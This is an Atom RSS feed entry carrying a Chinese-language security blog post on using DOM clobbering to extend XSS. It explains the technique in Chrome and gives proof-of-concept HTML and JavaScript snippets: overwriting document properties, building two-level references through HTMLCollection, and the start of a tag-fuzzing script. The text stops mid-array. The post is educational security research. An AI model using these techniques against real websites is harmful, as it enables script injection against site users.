<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <generator>NUAA</generator>
    <id>https://blogroll.a2os.club</id>
    <title>NUAARSS</title>
    <updated>2020-04-15T00:07:23+08:00</updated>
    <link href="https://blogroll.a2os.club"/>
    <author>
        <name>NUAARSS</name>
    </author>
    
    
    <entry>
        <id>https://blog.zeddyu.info/2020/03/04/Dom-Clobbering/</id>
        <title><![CDATA[使用 Dom Clobbering 扩展 XSS]]></title>
        <updated>2020-04-11T11:55:30+08:00</updated>
        <link href="https://blog.zeddyu.info/2020/03/04/Dom-Clobbering/"/>
        <content type="text/html" src="https://blog.zeddyu.info/2020/03/04/Dom-Clobbering/"><![CDATA[<p>&#x524D;&#x51E0;&#x5929; PortSwigger &#x53D1;&#x5E03;&#x4E86; <a href="https://portswigger.net/research/top-10-web-hacking-techniques-of-2019" target="_blank" rel="noopener">Top 10 web hacking techniques of 2019</a>&#xFF0C;&#x699C;&#x4E0A;&#x7684;&#x653B;&#x51FB;&#x6280;&#x672F;&#x90FD;&#x6BD4;&#x8F83;&#x6709;&#x610F;&#x601D;&#xFF0C;p&#x725B;&#x4E5F;&#x80AF;&#x5B9A;&#x4F1A;&#x5728;&#x5C0F;&#x5BC6;&#x5708;&#x505A;&#x5206;&#x4EAB;&#x7684;&#xFF08;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x8BDD;&#x672C;&#x83DC;&#x4E5F;&#x4F1A;&#x5728;&#x81EA;&#x5DF1;<a href="https://blog.zeddyu.info">&#x535A;&#x5BA2;</a>&#x505A;&#x505A;&#x5B66;&#x4E60;&#x5206;&#x4EAB;&#xFF09;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x8FD9;&#x91CC;&#x5C31;&#x4E0D;&#x804A; Top 10 &#x6280;&#x672F;&#x4E86;&#xFF0C;&#x5C31;&#x770B;&#x770B;&#x5728; Top 10 &#x63D0;&#x540D;&#x7ED3;&#x679C;&#x6CA1;&#x4E0A;&#x699C;&#x4F46;&#x662F;&#x4F9D;&#x65E7;&#x5F88;&#x6709;&#x610F;&#x601D;&#x7684;&#x6280;&#x672F; Dom Clobbering&#x3002;</p><blockquote class="colorquote success"><p>&#x6587;&#x7AE0;&#x9996;&#x53D1;&#x4E8E;&#x5148;&#x77E5;&#x793E;&#x533A;&#xFF1A;<a href="https://xz.aliyun.com/t/7329" target="_blank" rel="noopener">https://xz.aliyun.com/t/7329</a></p></blockquote><a id="more"></a><h2 id="Basics"><a href="#Basics" class="headerlink" title="Basics"></a>Basics</h2><p>From <a href="https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model/Introduction" target="_blank" rel="noopener">MDN Web Docs</a>:</p><blockquote><p>&#x200B;    The Document Object Model (DOM) is a programming interface for HTML and XML documents. It represents the page so that programs can change the document structure, style, and content. The DOM represents the document as nodes and objects. That way, programming languages can connect to the page.</p><p>A Web page is a document. This document can be either displayed in the browser window or as the HTML source. But it is the same document in both cases. The Document Object Model (DOM) represents that same document so it can be manipulated. The DOM is an object-oriented representation of the web page, which can be modified with a scripting language such as JavaScript.</p><p>The <a href="http://www.w3.org/DOM/" target="_blank" rel="noopener">W3C DOM</a> and <a href="https://dom.spec.whatwg.org/" target="_blank" rel="noopener">WHATWG DOM</a> standards are implemented in most modern browsers. Many browsers extend the standard, so care must be exercised when using them on the web where documents may be accessed by various browsers with different DOMs.</p></blockquote><p>DOM &#x6700;&#x521D;&#x662F;&#x5728;&#x6CA1;&#x6709;&#x4EFB;&#x4F55;&#x6807;&#x51C6;&#x5316;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x8BDE;&#x751F;&#x548C;&#x5B9E;&#x73B0;&#x7684;&#xFF0C;&#x8FD9;&#x5BFC;&#x81F4;&#x4E86;&#x8BB8;&#x591A;&#x7279;&#x6B8A;&#x7684;&#x884C;&#x4E3A;&#xFF0C;&#x4F46;&#x662F;&#x4E3A;&#x4E86;&#x4FDD;&#x6301;&#x517C;&#x5BB9;&#x6027;&#xFF0C;&#x5F88;&#x591A;&#x6D4F;&#x89C8;&#x5668;&#x4ECD;&#x7136;&#x652F;&#x6301;&#x5F02;&#x5E38;&#x7684; DOM &#x3002;</p><p>DOM &#x7684;&#x65E7;&#x7248;&#x672C;&#xFF08;&#x5373;DOM Level 0 &amp; 1&#xFF09;&#x4EC5;&#x63D0;&#x4F9B;&#x4E86;&#x6709;&#x9650;&#x7684;&#x901A;&#x8FC7; JavaScript &#x5F15;&#x7528;&#x5143;&#x7D20;&#x7684;&#x65B9;&#x5F0F;&#xFF0C;&#x4E00;&#x4E9B;&#x7ECF;&#x5E38;&#x4F7F;&#x7528;&#x7684;&#x5143;&#x7D20;&#x5177;&#x6709;&#x4E13;&#x7528;&#x7684;&#x96C6;&#x5408;&#xFF08;&#x4F8B;&#x5982;<code>document.forms</code>&#xFF09;&#xFF0C;&#x800C;&#x5176;&#x4ED6;&#x5143;&#x7D20;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;<code>Window</code>&#x548C;<code>Document</code>&#x5BF9;&#x8C61;&#x4E0A;&#x7684;<code>name</code>&#x5C5E;&#x6027;&#x548C;<code>id</code>&#x5C5E;&#x6027;&#x6765;&#x5F15;&#x7528;&#xFF0C;</p><p>&#x663E;&#x7136;&#xFF0C;&#x652F;&#x6301;&#x8FD9;&#x4E9B;&#x5F15;&#x7528;&#x65B9;&#x5F0F;&#x4F1A;&#x5F15;&#x8D77;&#x6DF7;&#x6DC6;&#xFF0C;&#x5373;&#x4F7F;&#x8F83;&#x65B0;&#x7684;&#x89C4;&#x8303;&#x8BD5;&#x56FE;&#x89E3;&#x51B3;&#x6B64;&#x95EE;&#x9898;&#xFF0C;&#x4F46;&#x662F;&#x4E3A;&#x4E86;&#x5411;&#x540E;&#x517C;&#x5BB9;&#xFF0C;&#x5927;&#x591A;&#x6570;&#x884C;&#x4E3A;&#x90FD;&#x4E0D;&#x80FD;&#x8F7B;&#x6613;&#x66F4;&#x6539;&#x3002;&#x5E76;&#x4E14;&#xFF0C;&#x6D4F;&#x89C8;&#x5668;&#x4E4B;&#x95F4;&#x6CA1;&#x6709;&#x5171;&#x8BC6;&#xFF0C;&#x56E0;&#x6B64;&#x6BCF;&#x4E2A;&#x6D4F;&#x89C8;&#x5668;&#x53EF;&#x80FD;&#x9075;&#x5FAA;&#x4E0D;&#x540C;&#x7684;&#x89C4;&#x8303;&#xFF08;&#x751A;&#x81F3;&#x6839;&#x672C;&#x6CA1;&#x6709;&#x6807;&#x51C6;&#xFF09;&#x3002;&#x663E;&#x7136;&#xFF0C;&#x7F3A;&#x4E4F;&#x6807;&#x51C6;&#x5316;&#x610F;&#x5473;&#x7740;&#x786E;&#x4FDD;DOM&#x7684;&#x5B89;&#x5168;&#x662F;&#x4E00;&#x9879;&#x91CD;&#x5927;&#x6311;&#x6218;&#x3002;</p><p>&#x7531;&#x4E8E;&#x975E;&#x6807;&#x51C6;&#x5316;&#x7684; DOM &#x884C;&#x4E3A;&#xFF0C;&#x6D4F;&#x89C8;&#x5668;&#x6709;&#x65F6;&#x53EF;&#x80FD;&#x4F1A;&#x5411;&#x5404;&#x79CD; DOM &#x5143;&#x7D20;&#x6DFB;&#x52A0; name &amp; id &#x5C5E;&#x6027;&#xFF0C;&#x4F5C;&#x4E3A;&#x5BF9;&#x6587;&#x6863;&#x6216;&#x5168;&#x5C40;&#x5BF9;&#x8C61;&#x7684;&#x5C5E;&#x6027;&#x5F15;&#x7528;&#xFF0C;&#x4F46;&#x662F;&#xFF0C;&#x8FD9;&#x4F1A;&#x5BFC;&#x81F4;&#x8986;&#x76D6;&#x6389; document&#x539F;&#x6709;&#x7684;&#x5C5E;&#x6027;&#x6216;&#x5168;&#x5C40;&#x53D8;&#x91CF;&#xFF0C;&#x6216;&#x8005;&#x52AB;&#x6301;&#x4E00;&#x4E9B;&#x53D8;&#x91CF;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x800C;&#x4E14;&#x4E0D;&#x540C;&#x7684;&#x6D4F;&#x89C8;&#x5668;&#x8FD8;&#x6709;&#x4E0D;&#x540C;&#x7684;&#x89E3;&#x6790;&#x65B9;&#x5F0F;&#xFF0C;&#x6240;&#x4EE5;&#x672C;&#x6587;&#x7684;&#x5185;&#x5BB9;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x7279;&#x522B;&#x6807;&#x6CE8;&#xFF0C;&#x5747;&#x9ED8;&#x8BA4;&#x5728; <strong>Chrome 80.0.3987.116</strong> &#x7248;&#x672C;&#x4E0A;&#x8FDB;&#x884C;&#x3002; </p><p>Dom Clobbering &#x5C31;&#x662F;&#x4E00;&#x79CD;&#x5C06; HTML &#x4EE3;&#x7801;&#x6CE8;&#x5165;&#x9875;&#x9762;&#x4E2D;&#x4EE5;&#x64CD;&#x7EB5; DOM &#x5E76;&#x6700;&#x7EC8;&#x66F4;&#x6539;&#x9875;&#x9762;&#x4E0A; JavaScript &#x884C;&#x4E3A;&#x7684;&#x6280;&#x672F;&#x3002; &#x5728;&#x65E0;&#x6CD5;&#x76F4;&#x63A5; XSS &#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x5F80; DOM Clobbering &#x8FD9;&#x65B9;&#x5411;&#x8003;&#x8651;&#x4E86;&#x3002; </p><h2 id="Simple-Example"><a href="#Simple-Example" class="headerlink" title="Simple Example"></a>Simple Example</h2><p>&#x5176;&#x5B9E; Dom Clobbering &#x6BD4;&#x8F83;&#x7B80;&#x5355;&#xFF0C;&#x6211;&#x4EEC;&#x770B;&#x51E0;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x4F8B;&#x5B50;&#x5C31;&#x80FD;&#x77E5;&#x9053;&#x5B83;&#x662F;&#x5E72;&#x4EC0;&#x4E48;&#x4E86;&#x7684;&#x3002;</p><h3 id="Exmaple-1-Create"><a href="#Exmaple-1-Create" class="headerlink" title="Exmaple 1 - Create"></a>Exmaple 1 - Create</h3><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200225164841.png" alt></p><p>&#x4ECE;&#x56FE;&#x4E2D;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x901A;&#x8FC7; id &#x6216;&#x8005; name &#x5C5E;&#x6027;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5728;<code>document</code>&#x6216;&#x8005;<code>window</code>&#x5BF9;&#x8C61;&#x4E0B;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x5BF9;&#x8C61;&#x3002;</p><h3 id="Example-2-Overwrite"><a href="#Example-2-Overwrite" class="headerlink" title="Example 2 - Overwrite"></a>Example 2 - Overwrite</h3><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200222145150.png" alt></p><p>&#x53EF;&#x4EE5;&#x770B;&#x5230;<code>document.cookie</code>&#x5DF2;&#x7ECF;&#x88AB;&#x6211;&#x4EEC;&#x7528; img &#x6807;&#x7B7E;&#x7ED9;&#x8986;&#x76D6;&#x4E86;</p><h3 id="Example-3-Overwrite2"><a href="#Example-3-Overwrite2" class="headerlink" title="Example 3 - Overwrite2"></a>Example 3 - Overwrite2</h3><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200225165624.png" alt></p><p>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6211;&#x4EEC;&#x901A;&#x8FC7;&#x591A;&#x5C42;&#x8986;&#x76D6;&#x6389;&#x4E86;<code>document.body.appendChild</code>&#x65B9;&#x6CD5;&#x3002;</p><h2 id="Attack-Method"><a href="#Attack-Method" class="headerlink" title="Attack Method"></a>Attack Method</h2><p>&#x65E2;&#x7136;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x53BB;&#x521B;&#x5EFA;&#x6216;&#x8005;&#x8986;&#x76D6; document &#x6216;&#x8005; window &#x5BF9;&#x8C61;&#x7684;&#x67D0;&#x4E9B;&#x503C;&#xFF0C;&#x4F46;&#x662F;&#x770B;&#x8D77;&#x6765;&#x6211;&#x4EEC;&#x4E3E;&#x7684;&#x4F8B;&#x5B50;&#x53EA;&#x662F;&#x5229;&#x7528;&#x6807;&#x7B7E;&#x521B;&#x5EFA;&#x6216;&#x8005;&#x8986;&#x76D6;&#x6700;&#x7EC8;&#x5F97;&#x5230;&#x7684;&#x4E5F;&#x662F;&#x6807;&#x7B7E;&#xFF0C;&#x662F;&#x4E00;&#x4E2A;<code>HTMLElment</code>&#x5BF9;&#x8C61;&#x3002;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200225170736.png" alt></p><p>&#x4F46;&#x662F;&#x5BF9;&#x4E8E;&#x5927;&#x591A;&#x6570;&#x60C5;&#x51B5;&#x6765;&#x8BF4;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x80FD;&#x66F4;&#x9700;&#x8981;&#x5C06;&#x5176;&#x8F6C;&#x6362;&#x4E3A;&#x4E00;&#x4E2A;&#x53EF;&#x63A7;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x578B;&#xFF0C;&#x4EE5;&#x4FBF;&#x6211;&#x4EEC;&#x8FDB;&#x884C;&#x64CD;&#x4F5C;&#x3002;</p><h3 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="toString"></a>toString</h3><p>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4EE5;&#x4E0B;&#x4EE3;&#x7801;&#x6765;&#x8FDB;&#x884C; fuzz &#x5F97;&#x5230;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;<code>toString</code>&#x65B9;&#x6CD5;&#x5C06;&#x5176;&#x8F6C;&#x6362;&#x6210;&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x578B;&#x7684;&#x6807;&#x7B7E;&#xFF1A;</p><figure class="highlight javascript hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">Object</span>.getOwnPropertyNames(<span class="hljs-built_in">window</span>)</span><br><span class="line">.filter(<span class="hljs-function"><span class="hljs-params">p</span> =&gt;</span> p.match(<span class="hljs-regexp">/Element$/</span>))</span><br><span class="line">.map(<span class="hljs-function"><span class="hljs-params">p</span> =&gt;</span> <span class="hljs-built_in">window</span>[p])</span><br><span class="line">.filter(<span class="hljs-function"><span class="hljs-params">p</span> =&gt;</span> p &amp;&amp; p.prototype &amp;&amp; p.prototype.toString !== <span class="hljs-built_in">Object</span>.prototype.toString)</span><br></pre></td></tr></table></figure><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x4E24;&#x79CD;&#x6807;&#x7B7E;&#x5BF9;&#x8C61;&#xFF1A;<code>HTMLAreaElement (&lt;area&gt;)</code>&amp; <code>HTMLAnchorElement (&lt;a&gt;)</code>&#xFF0C;&#x8FD9;&#x4E24;&#x4E2A;&#x6807;&#x7B7E;&#x5BF9;&#x8C61;&#x6211;&#x4EEC;&#x90FD;&#x53EF;&#x4EE5;&#x5229;&#x7528;<code>href</code>&#x5C5E;&#x6027;&#x6765;&#x8FDB;&#x884C;&#x5B57;&#x7B26;&#x4E32;&#x8F6C;&#x6362;&#x3002;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200225225659.png" alt></p><h3 id="HTMLCollection"><a href="#HTMLCollection" class="headerlink" title="HTMLCollection"></a>HTMLCollection</h3><p>&#x4F46;&#x662F;&#x5982;&#x679C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x7684;&#x662F;<code>x.y</code>&#x8FD9;&#x79CD;&#x5F62;&#x5F0F;&#x5462;&#xFF1F;&#x4E24;&#x5C42;&#x7ED3;&#x6784;&#x6211;&#x4EEC;&#x5E94;&#x8BE5;&#x600E;&#x4E48;&#x529E;&#x5462;&#xFF1F;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5C1D;&#x8BD5;&#x4E0A;&#x8FF0;&#x7684;&#x529E;&#x6CD5;&#xFF1A;</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">y</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&apos;1:hasaki&apos;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line">  alert(x.y);</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>&#x8FD9;&#x91CC;&#x65E0;&#x8BBA;&#x7B2C;&#x4E00;&#x4E2A;&#x6807;&#x7B7E;&#x600E;&#x4E48;&#x7EC4;&#x5408;&#xFF0C;&#x5F97;&#x5230;&#x7684;&#x7ED3;&#x679C;&#x90FD;&#x53EA;&#x662F;<code>undefined</code>&#x3002;&#x4F46;&#x662F;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x53E6;&#x4E00;&#x79CD;&#x65B9;&#x6CD5;&#x52A0;&#x5165;&#x5F15;&#x5165; name &#x5C5E;&#x6027;&#x5C31;&#x4F1A;&#x6709;&#x5176;&#x4ED6;&#x7684;&#x6548;&#x679C;&#x3002;</p><p><code>HTMLCollection</code>&#x662F;&#x4E00;&#x4E2A;<code>element</code>&#x7684;&#x201C;&#x96C6;&#x5408;&#x201D;&#x7C7B;&#xFF0C;&#x5728;&#x6700;&#x65B0;&#x7684; <a href="https://dom.spec.whatwg.org/#interface-htmlcollection" target="_blank" rel="noopener">Dom &#x6807;&#x51C6;</a>&#x4E2D; IDL &#x63CF;&#x8FF0;&#x5982;&#x4E0B;&#xFF1A;</p><blockquote><p>[Exposed=Window, LegacyUnenumerableNamedProperties]<br>interface HTMLCollection {<br>  readonly attribute unsigned long length;<br>  getter Element? item(unsigned long index);<br>  getter Element? namedItem(DOMString name);<br>};</p></blockquote><p>&#x6587;&#x4E2D;&#x4E5F;&#x63D0;&#x5230;&#x4E86;</p><blockquote><p>&#x200B;    <code>HTMLCollection</code> <em>is a historical artifact we cannot rid the web of. While developers are of course welcome to keep using it, new API standard designers ought not to use it (use</em> <code>sequence</code> <em>in IDL instead).</em></p></blockquote><p>&#x5B83;&#x662F;&#x4E00;&#x79CD;&#x5386;&#x53F2;&#x4EA7;&#x7269;&#xFF0C;&#x5E76;&#x4E14;&#x5728;&#x4ECA;&#x5929;&#x6211;&#x4EEC;&#x4E5F;&#x53EF;&#x4EE5;&#x7EE7;&#x7EED;&#x4F7F;&#x7528;&#x8FD9;&#x4E2A;&#x7C7B;&#xFF0C;&#x53EA;&#x662F;&#x5BF9;&#x4E8E; API &#x6807;&#x51C6;&#x8BBE;&#x8BA1;&#x8005;&#x4E0D;&#x63A8;&#x8350;&#x518D;&#x4F7F;&#x7528;&#x3002;</p><p>&#x5173;&#x4E8E;&#x5B83;&#x7684;&#x7528;&#x6CD5;&#xFF1A;</p><blockquote><p>collection . <code>length</code></p><p>&#x200B;    Returns the number of <a href="https://dom.spec.whatwg.org/#concept-element" target="_blank" rel="noopener">elements</a> in the <a href="https://dom.spec.whatwg.org/#concept-collection" target="_blank" rel="noopener">collection</a>.</p><p>element = collection . <code>item(index)</code></p><p>element = collection[index]</p><p>&#x200B;    Returns the <a href="https://dom.spec.whatwg.org/#concept-element" target="_blank" rel="noopener">element</a> with index index from the <a href="https://dom.spec.whatwg.org/#concept-collection" target="_blank" rel="noopener">collection</a>. The <a href="https://dom.spec.whatwg.org/#concept-element" target="_blank" rel="noopener">elements</a> are sorted in <a href="https://dom.spec.whatwg.org/#concept-tree-order" target="_blank" rel="noopener">tree order</a>.</p><p>element = collection . <code>namedItem(name)</code></p><p>element = collection[name]</p><p>&#x200B;    Returns the first <a href="https://dom.spec.whatwg.org/#concept-element" target="_blank" rel="noopener">element</a> with <a href="https://dom.spec.whatwg.org/#concept-id" target="_blank" rel="noopener">ID</a> or name name from the collection.</p></blockquote><p>&#x8BA9;&#x6211;&#x4EEC;&#x503C;&#x5F97;&#x6CE8;&#x610F;&#x7684;&#x662F;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;<code>collection[name]</code>&#x7684;&#x5F62;&#x5F0F;&#x6765;&#x8C03;&#x7528;&#x5176;&#x4E2D;&#x7684;&#x5143;&#x7D20;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x4F3C;&#x4E4E;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5148;&#x6784;&#x5EFA;&#x4E00;&#x4E2A;<code>HTMLCollection</code>&#xFF0C;&#x518D;&#x901A;&#x8FC7;<code>collection[name]</code>&#x7684;&#x5F62;&#x5F0F;&#x6765;&#x8C03;&#x7528;&#x3002;</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;x&quot;</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">y</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;1:hasaki&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200225232907.png" alt></p><h3 id="HTML-Relationships"><a href="#HTML-Relationships" class="headerlink" title="HTML Relationships"></a>HTML Relationships</h3><p>&#x518D;&#x8005;&#xFF0C;&#x6211;&#x4EEC;&#x4E5F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5229;&#x7528; HTML &#x6807;&#x7B7E;&#x4E4B;&#x95F4;&#x5B58;&#x5728;&#x7684;&#x5173;&#x7CFB;&#x6765;&#x6784;&#x5EFA;&#x5C42;&#x7EA7;&#x5173;&#x7CFB;&#x3002;</p><figure class="highlight javascript hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> log=[];</span><br><span class="line"><span class="hljs-keyword">var</span> html = [<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;abbr&quot;</span>,<span class="hljs-string">&quot;acronym&quot;</span>,<span class="hljs-string">&quot;address&quot;</span>,<span class="hljs-string">&quot;applet&quot;</span>,<span class="hljs-string">&quot;area&quot;</span>,<span class="hljs-string">&quot;article&quot;</span>,<span class="hljs-string">&quot;aside&quot;</span>,<span class="hljs-string">&quot;audio&quot;</span>,<span class="hljs-string">&quot;b&quot;</span>,<span class="hljs-string">&quot;base&quot;</span>,<span class="hljs-string">&quot;basefont&quot;</span>,<span class="hljs-string">&quot;bdi&quot;</span>,<span class="hljs-string">&quot;bdo&quot;</span>,<span class="hljs-string">&quot;bgsound&quot;</span>,<span class="hljs-string">&quot;big&quot;</span>,<span class="hljs-string">&quot;blink&quot;</span>,<span class="hljs-string">&quot;blockquote&quot;</span>,<span class="hljs-string">&quot;body&quot;</span>,<span class="hljs-string">&quot;br&quot;</span>,<span class="hljs-string">&quot;button&quot;</span>,<span class="hljs-string">&quot;canvas&quot;</span>,<span class="hljs-string">&quot;caption&quot;</span>,<span class="hljs-string">&quot;center&quot;</span>,<span class="hljs-string">&quot;cite&quot;</span>,<span class="hljs-string">&quot;code&quot;</span>,<span class="hljs-string">&quot;col&quot;</span>,<span class="hljs-string">&quot;colgroup&quot;</span>,<span class="hljs-string">&quot;command&quot;</span>,<span class="hljs-string">&quot;content&quot;</span>,<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;datalist&quot;</span>,<span class="hljs-string">&quot;dd&quot;</span>,<span class="hljs-string">&quot;del&quot;</span>,<span class="hljs-string">&quot;details&quot;</span>,<span class="hljs-string">&quot;dfn&quot;</span>,<span class="hljs-string">&quot;dialog&quot;</span>,<span class="hljs-string">&quot;dir&quot;</span>,<span class="hljs-string">&quot;div&quot;</span>,<span class="hljs-string">&quot;dl&quot;</span>,<span class="hljs-string">&quot;dt&quot;</span>,<span class="hljs-string">&quot;element&quot;</span>,<span class="hljs-string">&quot;em&quot;</span>,<span class="hljs-string">&quot;embed&quot;</span>,<span class="hljs-string">&quot;fieldset&quot;</span>,<span class="hljs-string">&quot;figcaption&quot;</span>,<span class="hljs-string">&quot;figure&quot;</span>,<span class="hljs-string">&quot;font&quot;</span>,<span class="hljs-string">&quot;footer&quot;</span>,<span class="hljs-string">&quot;form&quot;</span>,<span class="hljs-string">&quot;frame&quot;</span>,<span class="hljs-string">&quot;frameset&quot;</span>,<span class="hljs-string">&quot;h1&quot;</span>,<span class="hljs-string">&quot;head&quot;</span>,<span class="hljs-string">&quot;header&quot;</span>,<span class="hljs-string">&quot;hgroup&quot;</span>,<span class="hljs-string">&quot;hr&quot;</span>,<span class="hljs-string">&quot;html&quot;</span>,<span class="hljs-string">&quot;i&quot;</span>,<span class="hljs-string">&quot;iframe&quot;</span>,<span class="hljs-string">&quot;image&quot;</span>,<span class="hljs-string">&quot;img&quot;</span>,<span class="hljs-string">&quot;input&quot;</span>,<span class="hljs-string">&quot;ins&quot;</span>,<span class="hljs-string">&quot;isindex&quot;</span>,<span class="hljs-string">&quot;kbd&quot;</span>,<span class="hljs-string">&quot;keygen&quot;</span>,<span class="hljs-string">&quot;label&quot;</span>,<span class="hljs-string">&quot;legend&quot;</span>,<span class="hljs-string">&quot;li&quot;</span>,<span class="hljs-string">&quot;link&quot;</span>,<span class="hljs-string">&quot;listing&quot;</span>,<span class="hljs-string">&quot;main&quot;</span>,<span class="hljs-string">&quot;map&quot;</span>,<span class="hljs-string">&quot;mark&quot;</span>,<span class="hljs-string">&quot;marquee&quot;</span>,<span class="hljs-string">&quot;menu&quot;</span>,<span class="hljs-string">&quot;menuitem&quot;</span>,<span class="hljs-string">&quot;meta&quot;</span>,<span class="hljs-string">&quot;meter&quot;</span>,<span class="hljs-string">&quot;multicol&quot;</span>,<span class="hljs-string">&quot;nav&quot;</span>,<span class="hljs-string">&quot;nextid&quot;</span>,<span class="hljs-string">&quot;nobr&quot;</span>,<span class="hljs-string">&quot;noembed&quot;</span>,<span class="hljs-string">&quot;noframes&quot;</span>,<span class="hljs-string">&quot;noscript&quot;</span>,<span class="hljs-string">&quot;object&quot;</span>,<span class="hljs-string">&quot;ol&quot;</span>,<span class="hljs-string">&quot;optgroup&quot;</span>,<span class="hljs-string">&quot;option&quot;</span>,<span class="hljs-string">&quot;output&quot;</span>,<span class="hljs-string">&quot;p&quot;</span>,<span class="hljs-string">&quot;param&quot;</span>,<span class="hljs-string">&quot;picture&quot;</span>,<span class="hljs-string">&quot;plaintext&quot;</span>,<span class="hljs-string">&quot;pre&quot;</span>,<span class="hljs-string">&quot;progress&quot;</span>,<span class="hljs-string">&quot;q&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>,<span class="hljs-string">&quot;rp&quot;</span>,<span class="hljs-string">&quot;rt&quot;</span>,<span class="hljs-string">&quot;rtc&quot;</span>,<span class="hljs-string">&quot;ruby&quot;</span>,<span class="hljs-string">&quot;s&quot;</span>,<span class="hljs-string">&quot;samp&quot;</span>,<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;section&quot;</span>,<span class="hljs-string">&quot;select&quot;</span>,<span class="hljs-string">&quot;shadow&quot;</span>,<span class="hljs-string">&quot;slot&quot;</span>,<span class="hljs-string">&quot;small&quot;</span>,<span class="hljs-string">&quot;source&quot;</span>,<span class="hljs-string">&quot;spacer&quot;</span>,<span class="hljs-string">&quot;span&quot;</span>,<span class="hljs-string">&quot;strike&quot;</span>,<span class="hljs-string">&quot;strong&quot;</span>,<span class="hljs-string">&quot;style&quot;</span>,<span class="hljs-string">&quot;sub&quot;</span>,<span class="hljs-string">&quot;summary&quot;</span>,<span class="hljs-string">&quot;sup&quot;</span>,<span class="hljs-string">&quot;svg&quot;</span>,<span class="hljs-string">&quot;table&quot;</span>,<span class="hljs-string">&quot;tbody&quot;</span>,<span class="hljs-string">&quot;td&quot;</span>,<span class="hljs-string">&quot;template&quot;</span>,<span class="hljs-string">&quot;textarea&quot;</span>,<span class="hljs-string">&quot;tfoot&quot;</span>,<span class="hljs-string">&quot;th&quot;</span>,<span class="hljs-string">&quot;thead&quot;</span>,<span 